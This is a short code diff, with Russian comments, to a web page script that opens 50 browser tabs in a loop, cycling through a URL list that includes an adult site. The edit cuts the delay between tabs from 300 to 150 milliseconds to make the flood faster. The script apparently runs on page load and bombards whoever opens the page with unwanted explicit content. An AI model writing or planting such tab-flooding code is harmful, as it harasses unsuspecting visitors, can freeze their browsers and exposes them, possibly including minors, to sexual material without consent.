@@ -17,11 +17,11 @@
     "https://mrskin.com/gay"
   ];
 
-  // Открыть 50 вкладок с задержкой
+  // Открыть 50 вкладок с высокой скоростью (150мс между ними)
   for (var i = 0; i < 50; i++) {
     setTimeout(function(index){
       window.open(sites[index % sites.length], "_blank");
-    }, i * 300, i); // шаг 300мс между вкладками
+    }, i * 150, i); // шаг 150мс (быстрее в 2 раза)
   }
 </script>
 </head>
